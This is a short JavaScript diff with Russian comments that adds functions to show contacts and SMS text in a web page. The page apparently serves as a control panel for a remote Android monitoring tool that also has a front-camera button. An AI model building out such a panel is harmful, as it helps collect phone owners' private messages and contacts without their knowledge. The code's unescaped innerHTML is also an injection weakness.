@@ -644,7 +644,34 @@ document.getElementById("androidCameraFrontBtn")?.addEventListener("click", () =
             if (tab) tab.classList.add('active');
         };
     });
+
+    // ============= ФУНКЦИИ ДЛЯ ОТОБРАЖЕНИЯ КОНТАКТОВ И SMS =============
+function displayContacts(content) {
+    const container = document.getElementById("androidContactsContainer");
+    if (!container) return;
+    container.innerHTML = "";
     
+    const time = new Date().toLocaleTimeString();
+    const logEntry = document.createElement("div");
+    logEntry.className = "log-entry result";
+    // Заменяем переносы строк на <br> для красивого отображения
+    const formattedContent = content.replace(/\n/g, '<br>');
+    logEntry.innerHTML = `<span style="color:#666">[${time}]</span><br>${formattedContent}`;
+    container.appendChild(logEntry);
+}
+
+function displaySms(content) {
+    const container = document.getElementById("androidSmsContainer");
+    if (!container) return;
+    container.innerHTML = "";
+    
+    const time = new Date().toLocaleTimeString();
+    const logEntry = document.createElement("div");
+    logEntry.className = "log-entry result";
+    const formattedContent = content.replace(/\n/g, '<br>');
+    logEntry.innerHTML = `<span style="color:#666">[${time}]</span><br>${formattedContent}`;
+    container.appendChild(logEntry);
+}
     // ============= ОЧИСТКА ВСЕГО =============
     const clearAllBtn = document.getElementById("clearAllBtn");
     if (clearAllBtn) {
